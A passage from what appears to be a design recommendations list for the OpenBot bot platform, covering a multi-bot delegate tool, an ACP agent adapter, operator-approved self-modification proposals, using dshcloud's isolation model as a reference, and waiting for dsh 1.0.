  several bots and collect structured results. Bot replies wake only the first mention, and each bot
  runs one thing at a time. A `delegate` tool could:
  - post the sub-tasks to the target bots,
  - park the caller (as `ask_human` does), and
  - resume it once all results, optionally checked against an output schema, have arrived.

  This changes core routing rules, so write it up and raise it with upstream before building it.
- **R4 An ACP provider for bots.** dsh speaks ACP (the Agent Client Protocol). An ACP adapter in
  OpenBot's coding-agent seam (`runtime/cli_agents`) would let a bot run its turns through dsh, Codex
  or other ACP agents, the same way Claude Code bots work today. Check that ACP's permission
  requests can map onto OpenBot's read-only and edit levels.
- **R5 Self-modification: approval-gated proposals only.** Do not copy Creator mode. If bots should
  be able to suggest changes, let a bot draft a settings change, a plugin enablement or a bot
  definition as a proposal. The proposal arrives as a question item, and only the operator applies
  it. Code is never installed by an agent. This also gives U2 a constructive replacement for the
  unbounded `create_bot`.
- **R6 Use dshcloud as a reference, not a dependency.** Its isolation model (a container per
  workspace, hard disk quotas, ports bound to loopback behind an authenticating proxy, firewall rules
  against private networks) is a useful reference for upstream's per-thread containers (#145) and for
  accounts if they ever arrive. Its host-root node agent is not.
- **R7 Do not build on dsh yet.** Every release so far is a prerelease with breaking changes.
  Revisit at 1.0. R4 gets most of the benefit without coupling to its internals.
